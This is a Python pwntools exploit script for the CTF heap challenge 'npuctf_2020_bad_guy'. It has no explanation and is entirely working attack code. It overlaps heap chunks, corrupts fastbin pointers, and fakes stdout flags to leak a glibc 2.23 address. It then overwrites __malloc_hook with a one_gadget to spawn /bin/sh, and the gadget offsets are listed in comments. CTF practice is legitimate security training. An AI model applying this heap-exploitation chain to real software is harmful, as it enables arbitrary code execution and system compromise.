from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=remote("node4.buuoj.cn",25428)
io=process("./npuctf_2020_bad_guy")
elf=ELF("./npuctf_2020_bad_guy")
libc=ELF("libc-2.23.so")

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

def add(n,s,cc):
    io.sendlineafter(b">> ",b"1")
    io.sendlineafter(b"Index :",str(n))
    io.sendlineafter(b"size: ",str(s))
    io.sendafter(b"Content:",cc)
    
def edit(n,s,cc):
    io.sendlineafter(b">> ",b"2")
    io.sendlineafter(b"Index :",str(n))
    io.sendlineafter(b"size: ",str(s))
    io.sendafter(b"content: ",cc)
    
def delete(n):
    io.sendlineafter(b">> ",b"3")
    io.sendlineafter(b"Index :",str(n))
    
gdb.attach(io)
pause()  
    
add(0,0x10,b"aaa")
add(1,0x10,b"bbb")
add(2,0x60,b"ccc")
add(3,0x10,b"ddd")

delete(2)

payload=cyclic(0x18)+p64(0x91)
edit(0,len(payload),payload)

delete(1)

add(4,0x10,b"bbb")

payload=p64(0)*3+p64(0x71)+b"\xdd\x55"
edit(4,len(payload),payload)

add(5,0x60,b"eee")

payload=b"\x00"*0x33+p64(0xfbad1887)+p64(0)*3+b"\x00"

add(6,0x60,payload)

leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-192-libc.sym[b"_IO_2_1_stderr_"]
print("leak_addr: "+hex(leak_addr))
malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
shell=leak_addr+one_gadget[3]

add(7,0x60,b"aaa")
delete(7)

payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)
edit(4,len(payload),payload)

add(8,0x60,b"qqq")
add(9,0x60,cyclic(0x13)+p64(shell))
# add(7,0x60,b"ooo")
io.sendlineafter(b">> ",b"1")
io.sendlineafter(b"Index :",b"7")
io.sendlineafter(b"size: ",b"18")

io.interactive()

# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

